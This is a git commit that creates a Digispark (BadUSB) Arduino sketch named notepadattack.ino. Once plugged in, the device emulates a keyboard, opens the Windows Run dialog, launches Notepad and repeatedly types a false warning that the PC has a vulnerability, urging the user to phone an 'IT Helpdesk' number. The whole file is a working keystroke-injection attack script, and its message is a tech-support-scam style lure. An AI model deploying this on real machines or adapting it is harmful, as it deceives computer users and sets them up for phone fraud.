cc0babbc85085e0c2b544043c3d2c6d47133e64f
cybersomething <46792838+cybersomething@users.noreply.github.com>
2019-04-28 16:46:17 +0100

    Create notepadattack.ino

---
+++ NotepadAttack/notepadattack.ino
@@ -0,0 +1,19 @@
+#include "DigiKeyboard.h"
+void setup() 
+{
+  //left empty deliberately
+}
+void loop() 
+{
+DigiKeyboard.delay(10000);
+DigiKeyboard.update();
+DigiKeyboard.delay(100);
+// meta+r, delete content, start notepad
+DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); // meta+r
+DigiKeyboard.delay(100);
+DigiKeyboard.sendKeyStroke(76); // Clean it up
+DigiKeyboard.delay(50);
+DigiKeyboard.println("notepad.exe");
+DigiKeyboard.delay(200);
+DigiKeyboard.println("Hello, your PC has been found to have a vulnerability, please phone IT Helpdesk on 01234 567 890");
+}
